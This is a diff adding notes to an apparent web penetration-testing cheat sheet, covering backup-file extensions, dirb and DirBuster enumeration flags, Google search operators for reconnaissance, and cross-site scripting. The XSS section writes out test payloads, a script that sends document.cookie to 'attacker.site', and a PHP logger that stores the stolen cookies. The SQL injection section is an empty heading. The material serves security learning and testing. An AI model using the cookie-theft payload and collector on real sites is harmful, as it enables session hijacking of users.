@@ -52,3 +52,86 @@ Host: example.site
 Directories and Files Enumeration
 ------------------
 ------------------
+common file extentions for backups: .bak .old .txt .xxx
+
+Dirbuster
+------------------
+https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
+
+Dirb
+------------------
+dirb <target url> <path to wordlist>
+-a "user agent"
+> http://useragentstring.com/pages/useragentstring.php
+-p Proxy through Burp
+> dirb <target url> -p http://127.0.0.1:8080
+-c Cookie
+> dirb <target url> -c "COOKIE:XYZ"
+-u authentitaction
+> dirb <target url> -u "admin:password"
+-H header
+> dirb <target url> -H "MyHeader: MyContent"
+-r no recurse
+-z time to wait in milliseconds
+-S hide process only show foundings
+-X extensions to specify
+> dirb <target url> ".php,.bak"
+-x path to file with extensions
+-o save findings in file
+
+
+Google Hacking
+------------------
+site:           hostname
+intitle:        title of page
+inurl:          URL as source
+filetype:       extensions like .pdf
+AND, OR, &, |:  locigal operators for search
+-:              filter out keywords
+
+http://www.amazon.com/Google-Hacking-Penetration-Testers-Johnny/dp/1597491764/ref=sr_1_1?ie=UTF8&qid=1302083660&sr=8-1
+https://developers.google.com/custom-search/docs/xml_results
+https://www.exploit-db.com/google-hacking-database
+
+
+Cross Site Scripting
+------------------
+<script>alert('XSS');</script>
+
+Reflected XSS:  <URL>/search.php?find=<payload>
+
+Persistent XSS: payload will be stored in website, like an guestbook
+
+Cookie Stealing
+<script>(document.cookie)</script>
+
+sending Cookie to Attacker:
+<script>
+var i = new Image();
+i.src = "http://attacker.site/log.php?q="+document.cookie;
+</script>
+
+log.php Script:
+<?php
+$filename="/tmp/log.txt";
+$fp=fopen($filename, 'a');
+$cookie=$_GET['q'];
+fwrite($fp, $cookie);
+fclose($fp);
+?>
+
+learn XSS:  https://hack.me/
+http://www.amazon.com/The-Web-Application-Hackers-Handbook/dp/1118026470
+https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
+
+
+SQL Injection
+------------------
+
+
+
+
+
+
+
+
